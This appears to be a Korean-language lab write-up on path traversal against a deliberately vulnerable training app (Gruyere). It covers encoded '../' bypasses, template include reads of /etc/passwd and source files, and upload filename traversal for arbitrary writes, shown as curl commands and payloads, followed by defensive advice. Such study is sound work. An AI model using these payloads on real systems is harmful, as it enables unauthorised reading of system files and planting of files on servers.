# Path Traversal — 정규화 부재가 여러 진입점에 중복될 때

## 원리

경로를 만드는 코드가 **정규화(canonicalization) 없이 사용자 입력을 문자열 결합**하면,
그 입력은 "파일 이름"이 아니라 "경로 문법"의 일부가 된다. 이때 중요한 성질이 셋 있다.

1. **차단은 경로마다 다르다.** 앞단(WAF/CDN/프레임워크 라우터)이 `../` 를 정규화해
   리다이렉트하더라도, **인코딩된 형태**(`%2e%2e%2f`)는 통과하는 경우가 많다 — 같은
   문자열을 다르게 디코딩하는 계층이 있으면 그 사이가 틈이다.
2. **같은 결함이 여러 진입점에 복제되면 한 곳만 막아서 닫히지 않는다.** "정적 파일 서빙"과
   "템플릿 include"가 각각 같은 `open(base + user_input)` 패턴을 쓰면, 화이트리스트를
   한쪽에만 걸어도 다른 쪽으로 같은 파일을 읽을 수 있다.
3. **경로이탈은 읽기만이 아니다.** 파일명을 그대로 받아 쓰기 경로에 결합하면 **임의 파일
   쓰기**가 되고, 그 쓰기 위치가 웹루트 안이면 "서버가 실행/서빙하는 파일을 심는" 단계로
   이어진다.

## 케이스 A — 인코딩 변형으로 프론트엔드 정규화 우회 (읽기)

평문 `../` 는 앞단이 302 로 정규화 제거한다. 슬래시까지 인코딩하면 통과한다.

```bash
# 차단: 302 (프론트엔드가 경로를 정규화)
/../secret.txt        /../../secret.txt        /%2e%2e/secret.txt
# 통과: 실제 파일 내용 반환
/%2e%2e%2fsecret.txt
/..%2fsecret.txt
```

**판정 팁**: `curl` 은 URL 의 `../` 를 클라이언트에서 먼저 정규화해 없애버리므로
`--path-as-is` 없이는 변형 실험이 무의미하다. 또 "확장자 화이트리스트"가 있는 앱에서는
읽히는 파일이 `.txt` 등 몇 종으로 제한된다(설정·소스는 차단).

## 케이스 B — 같은 결함이 템플릿 include 에도 복제 (화이트리스트 우회)

정적 서빙에만 확장자 화이트리스트를 걸어 둔 앱에서, 템플릿 엔진의 include 지시자가
같은 파일을 **다른 경로로** 읽어 준다.

```text
[[include:../secret.txt]][[/include:../secret.txt]]
[[include:../app_source.py]][[/include:../app_source.py]]
[[include:../../../../etc/passwd]][[/include:../../../../etc/passwd]]
```

```bash
# 대조군: 같은 파일을 정적 경로로 읽으면 막힌다 → 별도 우회 경로임을 증명
curl -s --path-as-is "https://<target>/<base>/%2e%2e%2fapp_source.py"   # Unrecognized file type
```

- include 구현이 `os.sep + filename.replace('/', os.sep)` 같은 조합을 써도 결과는
  `open(base + '/../x')` 이므로 정규화되지 않는다.
- **include 지시자는 블록 쌍이 필요할 수 있다**(`[[include:X]][[/include:X]]`) — 한쪽만
  쓰면 "실패"처럼 보인다. 페이로드 문법을 먼저 확인할 것.
- 파일이 없을 때 오류 대신 블록 본문을 그대로 출력하는 구현이 많다 → "빈 출력"이 곧
  실패 신호일 수 있다.

## 케이스 C — 업로드 파일명 경로이탈 (쓰기)

multipart `filename` 을 검증하지 않고 저장 경로에 결합하면 임의 쓰기가 된다.

```bash
curl -s -b <session> -F 'upload_file=@payload.txt;filename=../../written.txt' \
  "https://<target>/<base>/upload"
# 되읽기
curl -s --path-as-is "https://<target>/<base>/%2e%2e%2fwritten.txt"
# 다른 사용자 영역으로도 가능
curl -s -b <session> -F 'upload_file=@payload.txt;filename=../otheruser/probe.txt' \
  "https://<target>/<base>/upload"
```

**판정 함정 (중요)**: 이 앱은 **존재하지 않는 정적 파일에도 HTTP 200 + 오류 페이지**를
반환했다. 즉 상태코드로는 존재/성공을 판정할 수 없다.

```bash
# 잘못된 판정
curl -s -o /dev/null -w "%{http_code}" "$BASE/ext/absent.txt"       # 200  ← 성공처럼 보임
# 올바른 판정 — 본문 또는 다운로드 크기
curl -s "$BASE/ext/absent.txt" | grep -c "Invalid request"          # 1    ← 실패 신호
curl -s -o /dev/null -w "%{size_download}" "$BASE/ext/written.txt"  # 실제 내용 크기
```

## 확인된 사례

- 재확인된 사례: `google-gruyere-trial` (Round 2/7/9 — 인코딩 변형 읽기, 템플릿 include
  우회, 업로드 파일명 쓰기). 커스텀 템플릿 엔진 + Python2 파일 결합 구조.

## 방어 관점 메모

- 경로 결합은 **정규화 후 base prefix 검사**(`os.path.realpath` 결과가 base 로 시작하는지)로만
  막힌다. 금지 문자열 치환·확장자 화이트리스트는 진입점이 여러 개면 우회된다.
- 업로드 파일명은 **basename 만** 취하고 확장자를 검증해야 한다(서버가 렌더하는 확장자에
  주의 — `template-injection` 문서 참고).

<!-- 출처: journal/web/google-gruyere-trial/, Round 2 / Round 7 / Round 9 -->
